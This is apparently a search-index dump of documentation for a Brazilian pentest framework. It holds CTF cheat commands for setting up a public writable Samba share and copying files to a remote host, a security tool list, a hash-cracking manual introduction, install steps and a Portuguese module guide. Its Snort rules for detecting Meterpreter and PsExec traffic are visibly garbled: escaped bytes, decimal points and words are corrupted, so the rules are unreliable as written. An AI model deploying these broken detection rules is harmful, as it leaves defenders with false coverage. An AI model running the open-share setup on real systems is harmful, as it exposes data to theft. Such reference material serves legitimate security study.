/etc/samba/smb.conf"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#echo-valid-users-etcsambasmbconf","text":"","title":"echo valid users =  &gt;&gt;/etc/samba/smb.conf"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#echo-read-only-no-etcsambasmbconf","text":"","title":"echo read only = no &gt;&gt; /etc/samba/smb.conf"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#echo-browsable-yes-etcsambasmbconf","text":"","title":"echo browsable = yes &gt;&gt; /etc/samba/smb.conf"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#echo-public-yes-etcsambasmbconf","text":"","title":"echo public = yes &gt;&gt; /etc/samba/smb.conf"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#echo-writable-yes-etcsambasmbconf","text":"","title":"echo writable = yes &gt;&gt; /etc/samba/smb.conf"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#service-smbd-restart","text":"","title":"service smbd restart"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#visit-share-from-remote-system","text":"smb:\\","title":"Visit share from remote system:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#copy-files-to-remote-system","text":"scp @ :/","title":"Copy files to remote system:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#mount-and-smb-share-to-remote-system","text":"","title":"Mount and SMB share to remote system:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#mount-t-smbfs-o-username-mnt","text":"","title":"mount -t smbfs -o username= /// /mnt//"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#monitor-a-website-or-file-is-still-upthere","text":"","title":"Monitor a website or file is still up/there:"},{"location":"capturetheflag/basic/tips_end_tricks/os_cheats/#while-do-curl-ssr-http-i-head-n-1","text":"sleep 60; done","title":"while :; do curl -sSr http:// I head -n 1;"},{"location":"capturetheflag/basic/tips_end_tricks/snort/","text":"SNORT RULES Snort Rules to detect Meterpreter traffic: Ref.https://blog.didierstevens.com/2015/06/16/metasploit-meterpreter-reverse-https-snort-rule/ alert tcp $HOME_NET any-> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4,0 (compatible\\; MSIE 6.0\\; Windows NT 5.1) l0d 0al\"; http_header; classtype:trojanactivity; reference:url,blog,didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618000; rev:1;) alert tcp $HOME_NET any-> $EXTERNAL_NET $HTTP_PORTS ( msg: \"Metasploit User Agent St ring\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4.0 (compatible\\; MSIE 6,1\\; Windows NT) l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog,didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618001; rev: 1;) alert tcp $HOME_NET any-> $EXTERNAL_NET $HTTP_PORTS (msg: \"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4,0 (compatible\\; MSIE 7,0\\; Windows NT 6.0) l0d 0al\"; http_header; classtype:trojanactivity; reference:url,blog.didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618002; rev: 1;) alert tcp $HOME_NET any-> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4,0 (compatible\\; MSIE 7,0\\; Windows NT 6,0\\; Trident/4,0\\; SIMBAR={7DB0F6DE-8DE7-4841-9084- 28FA914B0F2E}\\; SLCCl\\; ,Nl0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog.didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618003; rev: 1;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4.0 (compatible\\; Metasploit RSPEC)l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog,didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618004; rev: 1;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/5,0 (Windows\\; U\\; Windows NT 5,1\\; en-US) AppleWebKit/525,13 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/525,13l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog.didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618005; rev: 1;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg: \"Metasploit User Agent St ring\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/5.0 (compatible\\; Googlebot/2.1\\; +http://www.google.com/bot.html) l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog,didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618006; rev: 1;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg: \"Metasploit User Agent St ring\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/5,0 (compatible\\; MSIE 10,0\\; Windows NT 6,1\\; Trident/6,0) l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog.didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618007; rev: 1;) Snort Rules to detect PSEXEC traffic: Ref. https://github.com/John-Lin/dockersnort/blob/master/snortrules-snapshot2972/rules/policy-other.rules alert tcp $HOME_NET any -> $HOME_NET [139,445] (msg:\"POLICY-OTHER use of psexec remote admin ist rat ion tool\"; flow: to_server, established; content:\" IFFISMB1A2I\"; depth:5; offset:4; content:\"ISC .00 I p I 00 Is I 00 I e I 00 Ix I 00 I e I 00 I c I 00 I s I 00 Iv I 00 I c\" ; nocase; metadata:service netbios-ssn; reference:url,technet.microsoft.com/enus/sysinternals/bb897553.aspx; classtype:policyviolation; sid:24008; rev:1;) alert tcp $HOME_NET any -> $HOME_NET [139,445] (msg:\"POLICY-OTHER use of psexec remote administration tool SMBv2\"; flow:to_server,established; content:\"IFEISMB\"; depth:8; nocase; content:\"105 001\"; within:2; distance:8; content:\"Pl001Sl00IEl00IXl00IEl00ISl00IVl00ICl00I\"; fast_pattern:only; metadata:service netbios-ssn; reference:url,technet.microsoft,com/enus/sysinternals/bb897553.aspx[l]; classtype:policyviolation; sid:30281; rev:1;)","title":"snort"},{"location":"capturetheflag/basic/tips_end_tricks/snort/#snort-rules","text":"","title":"SNORT RULES"},{"location":"capturetheflag/basic/tips_end_tricks/snort/#snort-rules-to-detect-meterpreter-traffic","text":"Ref.https://blog.didierstevens.com/2015/06/16/metasploit-meterpreter-reverse-https-snort-rule/ alert tcp $HOME_NET any-> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4,0 (compatible\\; MSIE 6.0\\; Windows NT 5.1) l0d 0al\"; http_header; classtype:trojanactivity; reference:url,blog,didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618000; rev:1;) alert tcp $HOME_NET any-> $EXTERNAL_NET $HTTP_PORTS ( msg: \"Metasploit User Agent St ring\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4.0 (compatible\\; MSIE 6,1\\; Windows NT) l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog,didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618001; rev: 1;) alert tcp $HOME_NET any-> $EXTERNAL_NET $HTTP_PORTS (msg: \"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4,0 (compatible\\; MSIE 7,0\\; Windows NT 6.0) l0d 0al\"; http_header; classtype:trojanactivity; reference:url,blog.didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618002; rev: 1;) alert tcp $HOME_NET any-> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4,0 (compatible\\; MSIE 7,0\\; Windows NT 6,0\\; Trident/4,0\\; SIMBAR={7DB0F6DE-8DE7-4841-9084- 28FA914B0F2E}\\; SLCCl\\; ,Nl0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog.didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618003; rev: 1;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/4.0 (compatible\\; Metasploit RSPEC)l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog,didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618004; rev: 1;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit User Agent String\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/5,0 (Windows\\; U\\; Windows NT 5,1\\; en-US) AppleWebKit/525,13 (KHTML, like Gecko) Chrome/4.0.221.6 Safari/525,13l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog.didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618005; rev: 1;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg: \"Metasploit User Agent St ring\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/5.0 (compatible\\; Googlebot/2.1\\; +http://www.google.com/bot.html) l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog,didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618006; rev: 1;) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg: \"Metasploit User Agent St ring\"; flow:to_server,established; content:\"User-Agentl3al Mozilla/5,0 (compatible\\; MSIE 10,0\\; Windows NT 6,1\\; Trident/6,0) l0d 0al\"; http_header; classtype:trojan-activity; reference:url,blog.didierstevens.com/2015/03/16/quic kpost-metasploit-user-agent-strings/; sid:1618007; rev: 1;)","title":"Snort Rules to detect Meterpreter traffic:"},{"location":"capturetheflag/basic/tips_end_tricks/snort/#snort-rules-to-detect-psexec-traffic","text":"Ref. https://github.com/John-Lin/dockersnort/blob/master/snortrules-snapshot2972/rules/policy-other.rules alert tcp $HOME_NET any -> $HOME_NET [139,445] (msg:\"POLICY-OTHER use of psexec remote admin ist rat ion tool\"; flow: to_server, established; content:\" IFFISMB1A2I\"; depth:5; offset:4; content:\"ISC .00 I p I 00 Is I 00 I e I 00 Ix I 00 I e I 00 I c I 00 I s I 00 Iv I 00 I c\" ; nocase; metadata:service netbios-ssn; reference:url,technet.microsoft.com/enus/sysinternals/bb897553.aspx; classtype:policyviolation; sid:24008; rev:1;) alert tcp $HOME_NET any -> $HOME_NET [139,445] (msg:\"POLICY-OTHER use of psexec remote administration tool SMBv2\"; flow:to_server,established; content:\"IFEISMB\"; depth:8; nocase; content:\"105 001\"; within:2; distance:8; content:\"Pl001Sl00IEl00IXl00IEl00ISl00IVl00ICl00I\"; fast_pattern:only; metadata:service netbios-ssn; reference:url,technet.microsoft,com/enus/sysinternals/bb897553.aspx[l]; classtype:policyviolation; sid:30281; rev:1;)","title":"Snort Rules to detect PSEXEC traffic:"},{"location":"capturetheflag/basic/tips_end_tricks/tools/","text":"PREBUILT ISO, VIRTUAL MACHINE AND DISTRIBUTIONS KALI - Open Source Pentesting Distribution Kali SIFT - SANS Investigative Forensics Toolkit SIFT REMNUX - A Linux Toolkit for Reverse-Engineering and Analyzing Malware REMNUX OPEN VAS - Open Source vulnerability scanner and manager OPEN VAS MOLOCH - Large scale IPv4 packet capturing (PCAP), indexing and database system MOLOCH SECURITY ONION - Linux distro for intrusion detection, network security monitoring, and log management SECURITY ONION NAGIOS - Network Monitoring, Alerting, Response, and Reporting Tool NAGIOS OSSEC - Scalable, multi-platform, open source Hostbased Intrusion Detection System OSSEC SAMURAI WTF - Pre-configured web pen-testing environment SAMURAI WTF RTIR - Request Tracker for Incident Response RTIR HONEYDRIVE - Pre-configured honeypot software packages HONEYDRIVE The Enhanced Mitigation Experience Toolkit - helps prevent vulnerabilities in software from being successfully exploited The Enhanced Mitigation Experience Toolkit ATTACK SURFACE ANALYZER BY MICROSOFT - Baseline Tool ATTACK SURFACE ANALYZERATTACK SURFACE ANALYZER WINDOWS TO GO - USB Portable Windows 8 WINDOWS TO GO WINFE - Windows Forensic Environment on CD/USB WINFE DCEPT - Deploying and detecting use of Active Directory honeytokens DCEPT TAILS - The Amnesic Incognito Live System TAILS","title":"tools"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#prebuilt-iso-virtual-machine-and-distributions","text":"","title":"PREBUILT ISO, VIRTUAL MACHINE AND DISTRIBUTIONS"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#kali-open-source-pentesting-distribution","text":"Kali","title":"KALI - Open Source Pentesting Distribution"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#sift-sans-investigative-forensics-toolkit","text":"SIFT","title":"SIFT - SANS Investigative Forensics Toolkit"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#remnux-a-linux-toolkit-for-reverse-engineering-and-analyzing-malware","text":"REMNUX","title":"REMNUX - A Linux Toolkit for Reverse-Engineering and Analyzing Malware"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#open-vas-open-source-vulnerability-scanner-and-manager","text":"OPEN VAS","title":"OPEN VAS - Open Source vulnerability scanner and manager"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#moloch-large-scale-ipv4-packet-capturing-pcap-indexing-and-database-system","text":"MOLOCH","title":"MOLOCH - Large scale IPv4 packet capturing (PCAP), indexing and database system"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#security-onion-linux-distro-for-intrusion-detection-network-security-monitoring-and-log-management","text":"SECURITY ONION","title":"SECURITY ONION - Linux distro for intrusion detection, network security monitoring, and log management"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#nagios-network-monitoring-alerting-response-and-reporting-tool","text":"NAGIOS","title":"NAGIOS - Network Monitoring, Alerting, Response, and Reporting Tool"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#ossec-scalable-multi-platform-open-source-hostbased-intrusion-detection-system","text":"OSSEC","title":"OSSEC - Scalable, multi-platform, open source Hostbased Intrusion Detection System"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#samurai-wtf-pre-configured-web-pen-testing-environment","text":"SAMURAI WTF","title":"SAMURAI WTF - Pre-configured web pen-testing environment"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#rtir-request-tracker-for-incident-response","text":"RTIR","title":"RTIR - Request Tracker for Incident Response"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#honeydrive-pre-configured-honeypot-software-packages","text":"HONEYDRIVE","title":"HONEYDRIVE - Pre-configured honeypot software packages"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#the-enhanced-mitigation-experience-toolkit-helps-prevent-vulnerabilities-in-software-from-being-successfully-exploited","text":"The Enhanced Mitigation Experience Toolkit","title":"The Enhanced Mitigation Experience Toolkit - helps prevent vulnerabilities in software from being successfully exploited"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#attack-surface-analyzer-by-microsoft-baseline-tool","text":"ATTACK SURFACE ANALYZERATTACK SURFACE ANALYZER","title":"ATTACK SURFACE ANALYZER BY MICROSOFT - Baseline Tool"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#windows-to-go-usb-portable-windows-8","text":"WINDOWS TO GO","title":"WINDOWS TO GO - USB Portable Windows 8"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#winfe-windows-forensic-environment-on-cdusb","text":"WINFE","title":"WINFE - Windows Forensic Environment on CD/USB"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#dcept-deploying-and-detecting-use-of-active-directory-honeytokens","text":"DCEPT","title":"DCEPT - Deploying and detecting use of Active Directory honeytokens"},{"location":"capturetheflag/basic/tips_end_tricks/tools/#tails-the-amnesic-incognito-live-system","text":"TAILS","title":"TAILS - The Amnesic Incognito Live System"},{"location":"capturetheflag/hash_crack/","text":"INTRO This manual is meant to be a reference guide for cracking tool usage and supportive tools that assist network defenders and pentesters in password recovery (cracking). This manual will not be covering the installation of these tools, but will include references to their proper installation, and if all else fails, Google. Updates and additions to this manual are planned yearly as advancements in cracking evolve. Password recovery is a battle against math, time, cost, and human behavior; and much like any battle, the tactics are constantly evolving. ACKNOWLEDGEMENTS This community would not enjoy the success and diversity without the following community members and contributors: Alexander \u2018Solar Designer\u2019 Peslvak, John The Ripper Team, & Community Jens \u2018atom\u2019 Steube, Hashcat Team, & Devoted Hashcat Forum Community Jeremi \u2018epixoip\u2019 Gosney Korelogic & the Crack Me If You Can Contest Robin \u2018DigiNinja\u2019 Wood (Pipal & CeWL) CynoSure Prime Team Chris \u2018Unix-ninja\u2019 Aurelio Per Thorsheim (PasswordsCon) Blandyuk & Rurapenthe (HashKiller Contest) Peter \u2018iphelix\u2019 Kacherginsky (PACK) Royce \u2018tychotithonus\u2019 Williams \u2018Waffle\u2019 And many, many, many more contributors. If a name was excluded from the above list please reach out and the next version will give them their due credit. Lastly, the tools, research, and file_suport covered in the book are the result of people\u2019s hard work. As such, I HIGHLY encourage all readers to DONATE to help assist in their efforts. A portion of the proceeds from this book will be distributed to the various researchers/projects. REQUIRED SOFTWARE In order to follow many of the techniques in this manual, you will want to install the following software on your Windows or *NIX host. This book does not cover how to install said software and assumes you were able to follow the included links and extensive support websites. HASHCAT v3.6 (or newer) https://hashcat.net/hashcat/ JOHN THE RIPPER (v1.8.0 JUMBO) http://www.openwall.com/john/ PACK V0.0.4 (Password Analysis and Cracking Toolkit) http://thesprawl.org/projects/pack/ Hashcat-utils v1.7 https://hashcat.net/wiki/doku.php?id=hashcat_utils Additionally you will need dictionaries/wordlists and highly recommend the below sources: WEAKPASS DICTIONARY https://weakpass.com/wordlist CRACKSTATION DICTIONARY https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm SKULL SECURITY WORDLISTS https://wiki.skullsecurity.org/index.php?title=Passwords Throughout the manual, generic names have been given to the various inputs required in a cracking commands structure. Legend description is below: COMMAND STRUCTURE LEGEND hashcat Generic representation of the various Hashcat binary names john Generic representation of the John the Ripper binary names #type Hash type; which is an abbreviation in John or a number in Hashcat hash.txt File containing target hashes to be cracked dict.txt File containing dictionary/wordlist rule.txt File containing permutation rules to alter dict.txt input passwords.txt File containing cracked password results outfile.txt File containing results of some functions output Lastly, as a good reference for testing various hash types to place into your \u201chash.txt\u201d file, the below sites contain all the various hashing algorithms and example output tailored for each cracking tool: HASHCAT HASH FORMAT EXAMPLES https://hashcat.net/wiki/doku.php?id=example_hashes JOHN THE RIPPER HASH FORMAT EXAMPLES http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats http://openwall.info/wiki/john/sample-hashes","title":"index"},{"location":"capturetheflag/hash_crack/#intro","text":"This manual is meant to be a reference guide for cracking tool usage and supportive tools that assist network defenders and pentesters in password recovery (cracking). This manual will not be covering the installation of these tools, but will include references to their proper installation, and if all else fails, Google. Updates and additions to this manual are planned yearly as advancements in cracking evolve. Password recovery is a battle against math, time, cost, and human behavior; and much like any battle, the tactics are constantly evolving.","title":"INTRO"},{"location":"capturetheflag/hash_crack/#acknowledgements","text":"This community would not enjoy the success and diversity without the following community members and contributors: Alexander \u2018Solar Designer\u2019 Peslvak, John The Ripper Team, & Community Jens \u2018atom\u2019 Steube, Hashcat Team, & Devoted Hashcat Forum Community Jeremi \u2018epixoip\u2019 Gosney Korelogic & the Crack Me If You Can Contest Robin \u2018DigiNinja\u2019 Wood (Pipal & CeWL) CynoSure Prime Team Chris \u2018Unix-ninja\u2019 Aurelio Per Thorsheim (PasswordsCon) Blandyuk & Rurapenthe (HashKiller Contest) Peter \u2018iphelix\u2019 Kacherginsky (PACK) Royce \u2018tychotithonus\u2019 Williams \u2018Waffle\u2019 And many, many, many more contributors. If a name was excluded from the above list please reach out and the next version will give them their due credit. Lastly, the tools, research, and file_suport covered in the book are the result of people\u2019s hard work. As such, I HIGHLY encourage all readers to DONATE to help assist in their efforts. A portion of the proceeds from this book will be distributed to the various researchers/projects.","title":"ACKNOWLEDGEMENTS"},{"location":"capturetheflag/hash_crack/#required-software","text":"In order to follow many of the techniques in this manual, you will want to install the following software on your Windows or *NIX host. This book does not cover how to install said software and assumes you were able to follow the included links and extensive support websites.","title":"REQUIRED SOFTWARE"},{"location":"capturetheflag/hash_crack/#hashcat-v36-or-newer","text":"https://hashcat.net/hashcat/","title":"HASHCAT v3.6 (or newer)"},{"location":"capturetheflag/hash_crack/#john-the-ripper-v180-jumbo","text":"http://www.openwall.com/john/","title":"JOHN THE RIPPER (v1.8.0 JUMBO)"},{"location":"capturetheflag/hash_crack/#pack-v004-password-analysis-and-cracking-toolkit","text":"http://thesprawl.org/projects/pack/","title":"PACK V0.0.4 (Password Analysis and Cracking Toolkit)"},{"location":"capturetheflag/hash_crack/#hashcat-utils-v17","text":"https://hashcat.net/wiki/doku.php?id=hashcat_utils","title":"Hashcat-utils v1.7"},{"location":"capturetheflag/hash_crack/#additionally-you-will-need-dictionarieswordlists-and-highly-recommend-the-below-sources-weakpass-dictionary","text":"https://weakpass.com/wordlist","title":"Additionally you will need dictionaries/wordlists and highly recommend the below sources: WEAKPASS DICTIONARY"},{"location":"capturetheflag/hash_crack/#crackstation-dictionary","text":"https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm","title":"CRACKSTATION DICTIONARY"},{"location":"capturetheflag/hash_crack/#skull-security-wordlists","text":"https://wiki.skullsecurity.org/index.php?title=Passwords Throughout the manual, generic names have been given to the various inputs required in a cracking commands structure. Legend description is below:","title":"SKULL SECURITY WORDLISTS"},{"location":"capturetheflag/hash_crack/#command-structure-legend","text":"","title":"COMMAND STRUCTURE LEGEND"},{"location":"capturetheflag/hash_crack/#hashcat","text":"Generic representation of the various Hashcat binary names","title":"hashcat"},{"location":"capturetheflag/hash_crack/#john","text":"Generic representation of the John the Ripper binary names","title":"john"},{"location":"capturetheflag/hash_crack/#type","text":"Hash type; which is an abbreviation in John or a number in Hashcat","title":"#type"},{"location":"capturetheflag/hash_crack/#hashtxt","text":"File containing target hashes to be cracked","title":"hash.txt"},{"location":"capturetheflag/hash_crack/#dicttxt","text":"File containing dictionary/wordlist","title":"dict.txt"},{"location":"capturetheflag/hash_crack/#ruletxt","text":"File containing permutation rules to alter dict.txt input","title":"rule.txt"},{"location":"capturetheflag/hash_crack/#passwordstxt","text":"File containing cracked password results","title":"passwords.txt"},{"location":"capturetheflag/hash_crack/#outfiletxt","text":"File containing results of some functions output Lastly, as a good reference for testing various hash types to place into your \u201chash.txt\u201d file, the below sites contain all the various hashing algorithms and example output tailored for each cracking tool: HASHCAT HASH FORMAT EXAMPLES https://hashcat.net/wiki/doku.php?id=example_hashes JOHN THE RIPPER HASH FORMAT EXAMPLES http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats http://openwall.info/wiki/john/sample-hashes","title":"outfile.txt"},{"location":"capturetheflag/hash_crack/CORE_HASH_CRACKING_KNOWLEDGE/","text":"ENCODING vs HASHING vs ENCRYPTING Encoding = transforms data into a publicly known scheme for usability Hashing = one-way cryptographic function nearly impossible to reverse Encrypting = mapping of input data and output data reversible with a key CPU vs GPU CPU = 2-72 cores mainly optimized for sequential serial processing GPU = 1000\u2019s of cores with 1000\u2019s of threads for parallel processin","title":"CORE_HASH_CRACKING_KNOWLEDGE"},{"location":"capturetheflag/hash_crack/CORE_HASH_CRACKING_KNOWLEDGE/#encoding-vs-hashing-vs-encrypting","text":"Encoding = transforms data into a publicly known scheme for usability Hashing = one-way cryptographic function nearly impossible to reverse Encrypting = mapping of input data and output data reversible with a key CPU vs GPU CPU = 2-72 cores mainly optimized for sequential serial processing GPU = 1000\u2019s of cores with 1000\u2019s of threads for parallel processin","title":"ENCODING vs HASHING vs ENCRYPTING"},{"location":"cli/build/","text":"PARA AS PROXIMAS VERSOES","title":"build"},{"location":"cli/build/#para-as-proximas-versoes","text":"","title":"PARA AS PROXIMAS VERSOES"},{"location":"cli/install/","text":"THG install passo a passo para fazer a instalacao do thg . arch linux pacman -Syy python3 python3-pip git clone https://github.com/darkcode357/thg-framework.git cd thg-framework pip3 install -r requirements.txt debian/ubuntu apt install python3 apt install python3-pip git clone https://github.com/darkcode357/thg-framework.git cd thg-framework pip3 install -r requirements.txt","title":"Installation"},{"location":"cli/install/#thg-install","text":"passo a passo para fazer a instalacao do thg .","title":"THG install"},{"location":"cli/install/#arch-linux","text":"pacman -Syy python3 python3-pip git clone https://github.com/darkcode357/thg-framework.git cd thg-framework pip3 install -r requirements.txt","title":"arch linux"},{"location":"cli/install/#debianubuntu","text":"apt install python3 apt install python3-pip git clone https://github.com/darkcode357/thg-framework.git cd thg-framework pip3 install -r requirements.txt","title":"debian/ubuntu"},{"location":"cli/tags/","text":"0box - 95854e1 Notes # vers\u00e3o 1.0 estavel logs Basicamente o changelogs s\u00e3o Principal, refiz o n\u00facleo do thg, usando a biblioteca cmd2 e adicionei uma database no projeto Agora o thg cont\u00e9m os seguintes novos comandos 1 Ali\u00e1s de comandos 2 Carregador de arquivo ali\u00e1s(externo) 3 Macros comandos 4 Lista de shortcut(atalhos para comandos) 5 Sistema Python interativo sem precisar iniciar o Python(ex Thg-console-> py x=10, consigo utilizar qualquer comando Python nativo) 6 ipython nativo 7 suporte a todos os std* 8 Suporte ao redirecionamento de sa\u00edda usando >> ou > | 9 Controle de busca via ctr-d 10 comandos + express\u00e3o regular 11 suporte command edit para modificar class principal do int\u00e9rpretes e para editar m\u00f3dulos 12 carregamento de comandos via arquivo externo/interno(Tipo rc) 13 convers\u00e3o de history para command_load Fim da vers\u00e3o est\u00e1vel do 2.1.0 Para a vers\u00e3o 2.1.1 teremos os seguintes aprimoramentos Show Adv (configura\u00e7\u00e3o avan\u00e7ada do int\u00e9rprete via cmd_adm --show para controlar todo o fluxo do sistema exemplo -> proxy ->threads ->libs ->Adv options em m\u00f3dulos documentacao na pr\u00f3xima vers\u00e3o git_commit commit tar.gz tar zip zip","title":"tags"},{"location":"cli/tags/#0box-95854e1","text":"Notes # vers\u00e3o 1.0 estavel","title":"0box - 95854e1"},{"location":"cli/tags/#logs","text":"Basicamente o changelogs s\u00e3o Principal, refiz o n\u00facleo do thg, usando a biblioteca cmd2 e adicionei uma database no projeto Agora o thg cont\u00e9m os seguintes novos comandos 1 Ali\u00e1s de comandos 2 Carregador de arquivo ali\u00e1s(externo) 3 Macros comandos 4 Lista de shortcut(atalhos para comandos) 5 Sistema Python interativo sem precisar iniciar o Python(ex Thg-console-> py x=10, consigo utilizar qualquer comando Python nativo) 6 ipython nativo 7 suporte a todos os std* 8 Suporte ao redirecionamento de sa\u00edda usando >> ou > | 9 Controle de busca via ctr-d 10 comandos + express\u00e3o regular 11 suporte command edit para modificar class principal do int\u00e9rpretes e para editar m\u00f3dulos 12 carregamento de comandos via arquivo externo/interno(Tipo rc) 13 convers\u00e3o de history para command_load Fim da vers\u00e3o est\u00e1vel do 2.1.0 Para a vers\u00e3o 2.1.1 teremos os seguintes aprimoramentos Show Adv (configura\u00e7\u00e3o avan\u00e7ada do int\u00e9rprete via cmd_adm --show para controlar todo o fluxo do sistema exemplo -> proxy ->threads ->libs ->Adv options em m\u00f3dulos","title":"logs"},{"location":"cli/tags/#documentacao-na-proxima-versao","text":"git_commit commit tar.gz tar zip zip","title":"documentacao na pr\u00f3xima vers\u00e3o"},{"location":"cli/templates/","text":"","title":"templates"},{"location":"dev/contributing/Contributing-to-thg/","text":"Guia de desenvolvimento de m\u00f3dulos Fazer o melhor trabalho requer esfor\u00e7os conjuntos de todos. Todos s\u00e3o bem-vindos para desenvolver m\u00f3dulos, trocar tecnologia de seguran\u00e7a e melhorar as habilidades de desenvolvimento Vou insistir em manter a biblioteca de m\u00f3dulos por um longo tempo e gostaria da ajuda de todos vis\u00e3o geral Para escrever um m\u00f3dulo completo do thg, voc\u00ea precisa atender aos seguintes requisitos: O m\u00f3dulo deve ser uma class e o nome da classe \u00e9 Modules A classe Modules deve herdar de BaseExploit/BaseAuxiliary/BasePost/BasePayload/BaseNops/BaseEvasion (introduzido por lib.BaseMode.mods import Base* ) O m\u00f3dulo deve conter o m\u00e9todo __init__ , que deve chamar o m\u00e9todo __init__ da classe pai (via super(\"Modules\", self).__init__() ) O m\u00f3dulo deve preencher as informa\u00e7\u00f5es relevantes, usando o m\u00e9todo self.thg_update_info () Os objetivos do POC est\u00e3o atualmente divididos em tipos http e tcp , usando self.register_tcp_target () para registrar alvos do tipo tcp. Registre o tipo de destino http com self.register_http_target () . Ap\u00f3s o registro, o alvo pode ser recuperado usando self.options.get_option . O m\u00e9todo check \u00e9 usado para detectar vulnerabilidades e n\u00e3o h\u00e1 comportamento de ataque. O m\u00e9todo exploit \u00e9 usado para implementar o comportamento de ataque, mas n\u00e3o pode ser usado para afetar a opera\u00e7\u00e3o normal do servidor. Nos m\u00e9todos check e exploit , se o teste for bem sucedido, chame o m\u00e9todo self.results.success () para salvar o resultado. Se falha chamer self.results.failure () para salvar o resultado. No processo de escrever os m\u00f3dulo do thg, se voc\u00ea usar pycharm , voc\u00ea pode seguir o m\u00e9todo acima para ver o c\u00f3digo e melhorar sua compreencao. Se voc\u00ea tiver d\u00favidas ou sugest\u00f5es, n\u00e3o hesite em entrar em contato comigo. darkcode357/luiz gustavo correa Case: test unauthorized detection module Basic code: :: import socket from lib.BaseMode.mods.Auxiliary.Auxiliary import BaseAuxiliary class Modules(BaseAuxiliary): def __init__(self): super(Modules, self).__init__() self.thg_update_info({ 